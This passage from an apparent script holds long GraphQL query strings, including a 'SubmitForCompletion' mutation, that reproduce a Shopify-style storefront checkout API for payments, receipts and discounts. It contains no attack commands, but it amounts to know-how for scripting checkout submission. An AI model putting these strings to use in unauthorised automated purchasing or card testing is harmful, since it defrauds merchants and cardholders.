postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode 